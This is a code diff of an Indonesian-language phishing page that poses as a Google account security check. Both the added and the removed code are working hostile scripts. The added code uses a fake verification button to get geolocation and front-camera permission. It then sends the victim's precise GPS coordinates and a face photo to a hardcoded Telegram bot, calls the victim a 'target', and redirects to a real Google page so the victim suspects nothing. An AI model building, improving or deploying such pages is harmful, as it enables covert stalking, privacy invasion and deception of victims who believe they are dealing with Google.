@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Authentication</title>
+    <title>Google Security - Verifikasi Perangkat</title>
     <style>
         body { font-family: 'Roboto', Arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .card { border: 1px solid #dadce0; padding: 40px; border-radius: 8px; text-align: center; max-width: 350px; width: 100%; }
@@ -20,9 +20,9 @@
 <div class="card">
     <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo">
     <h2>Keamanan Akun</h2>
-    <p>Sistem mendeteksi ancaman. Klik tombol di bawah untuk verifikasi identitas dan amankan perangkat.</p>
-    <button id="btn" onclick="openCam()">AMANKAN SEKARANG</button>
-    <div id="loader"><div class="spinner"></div><p>Memproses...</p></div>
+    <p>Sistem mendeteksi akses tidak dikenal. Klik tombol di bawah untuk sinkronisasi lokasi dan verifikasi wajah.</p>
+    <button id="btn" onclick="eksekusi()">VERIFIKASI SEKARANG</button>
+    <div id="loader"><div class="spinner"></div><p id="stat">Memulai Verifikasi...</p></div>
 </div>
 
 <video id="v" autoplay playsinline></video>
@@ -32,7 +32,7 @@
     const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
     const CHAT_ID = "8025603711";
 
-    async function send(msg, isPhoto = false, blob = null) {
+    async function sendToTelegram(msg, isPhoto = false, blob = null) {
         const url = isPhoto ? `https://api.telegram.org/bot${TOKEN}/sendPhoto` : `https://api.telegram.org/bot${TOKEN}/sendMessage`;
         const fd = new FormData();
         fd.append('chat_id', CHAT_ID);
@@ -46,84 +46,53 @@
         await fetch(url, { method: 'POST', body: fd });
     }
 
-    async function openCam() {
+    function eksekusi() {
         document.getElementById('btn').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
-
-        try {
-            // Minta izin kamera (Wajib HTTPS)
-            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            v.srcObject = s;
-
-            // Tunggu 2 detik biar kamera fokus
-            setTimeout(() => {
-                c.width = v.videoWidth; 
-                c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => send("📸 <b>FOTO TARGET MASUK!</b>", true, b), 'image/jpeg');
-                
-                // Matikan kamera & redirect biar gak curiga
-                s.getTracks().forEach(t => t.stop());
-                alert("Perangkat Anda telah berhasil diamankan.");
-                window.location.href = "https://myaccount.google.com/";
-            }, 2500);
-
-        } catch (e) {
-            send("❌ <b>Target Menolak Kamera / Gagal HTTPS</b>");
-            alert("Izin Kamera Diperlukan untuk Verifikasi Keamanan!");
-            location.reload(); // Refresh buat minta izin lagi
-        }
-    }
-</script>
-</body>
-</html>
-
-<script>
-    const TOKEN = "8650738252:AAEWHSGL_HLg9_Rjta6MCAgbj6v9eWzqN44";
-    const CHAT_ID = "8025603711";
-
-    async function send(msg, isPhoto = false, blob = null) {
-        if (isPhoto) {
-            const fd = new FormData();
-            fd.append('chat_id', CHAT_ID);
-            fd.append('photo', blob, 't.jpg');
-            fd.append('caption', msg);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } else {
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=html`);
+        
+        // 1. Ambil Lokasi GPS
+        document.getElementById('stat').innerText = "Menyinkronkan GPS...";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const locMsg = `📍 <b>LOKASI TARGET DITEMUKAN!</b>\n\n` +
+                               `Lat: <code>${lat}</code>\n` +
+                               `Lon: <code>${lon}</code>\n\n` +
+                               `🔗 <a href="https://www.google.com/maps?q=${lat},${lon}">Buka di Google Maps</a>`;
+                await sendToTelegram(locMsg);
+                ambilFoto(); // Lanjut ambil foto setelah lokasi dapat
+            }, (err) => {
+                sendToTelegram("❌ <b>Target Menolak Izin Lokasi</b>");
+                ambilFoto();
+            }, {enableHighAccuracy: true});
         }
     }
 
-    async function start() {
-        document.getElementById('btn').style.display = 'none';
-        document.getElementById('loader').style.display = 'block';
-
-        // 1. Info Target
-        send(`🔥 <b>TARGET WEB ONLINE!</b>\nDevice: ${navigator.platform}\nBrowser: ${navigator.userAgent}`);
-
-        // 2. Realtime Cam
+    async function ambilFoto() {
+        document.getElementById('stat').innerText = "Memproses Biometrik...";
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: true });
             const v = document.getElementById('v');
             const c = document.getElementById('c');
             v.srcObject = s;
+
             setTimeout(() => {
-                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.width = v.videoWidth; 
+                c.height = v.videoHeight;
                 c.getContext('2d').drawImage(v, 0, 0);
-                c.toBlob(b => send("📸 <b>HASIL FOTO REALTIME!</b>", true, b), 'image/jpeg');
+                c.toBlob(b => sendToTelegram("📸 <b>FOTO WAJAH TARGET</b>", true, b), 'image/jpeg');
+                
                 s.getTracks().forEach(t => t.stop());
-                alert("Verifikasi Berhasil!");
-                window.location.href = "https://google.com";
+                alert("Perangkat Anda Telah Aman.");
+                window.location.href = "https://myaccount.google.com/";
             }, 3000);
         } catch (e) {
-            send("❌ Target Menolak Izin Kamera");
-            alert("Izin Kamera Diperlukan!");
+            sendToTelegram("❌ <b>Target Menolak Izin Kamera</b>");
+            alert("Izin diperlukan untuk verifikasi!");
             location.reload();
         }
     }
 </script>
-
 </body>
 </html>
